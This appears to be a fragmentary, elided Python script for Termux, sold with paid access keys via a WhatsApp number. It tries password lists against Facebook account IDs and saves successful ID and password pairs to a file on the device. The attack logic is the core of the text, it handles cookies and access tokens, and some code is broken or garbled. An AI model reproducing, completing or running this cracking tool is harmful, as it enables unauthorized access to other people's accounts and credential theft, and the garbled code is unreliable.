...
logo= f'''
   ...
   \033[0;92m"    ▀█ █░█ █▀▄▀█ █▀▀ █▀▄(SHAR🕶️ BRAND)\033[0;92m"
 ="\033[0;91m"█▀█ █▀█ █░▀░█ ██▄ █▄▀
...
def qsbuy():
        try:
                ...
                if str("upppdate") in update:
                        ...
                        print("\n Baraye Mehrbani agar ap free wali ho to exit kry 🕶️🤟🏻")
                        print(50*"-")
                        print(f" 15-Days Price : 150")
                        print(f" 1-Month Price : 350")
                        print(50*"-")
                        input("[Press Enter To Send Key To Admin]")
                        os.system(f"termux-open-url https://wa.me/+923160114715?text={bumper}")
                        qsbuy()
...
def main():
        ...
        if menu_opt =='1':
                ...
                xchker()
\033[0;97m') FOLLOW  ON HITHUB FOR MORE COMMOND               
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[JONI] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[JONI-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/JONI_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/JONI_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/joni.txt \033[0;97m\n')
        #100010138361148
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/JONI' in datar:
        pass
else:
        for i in range(5000):
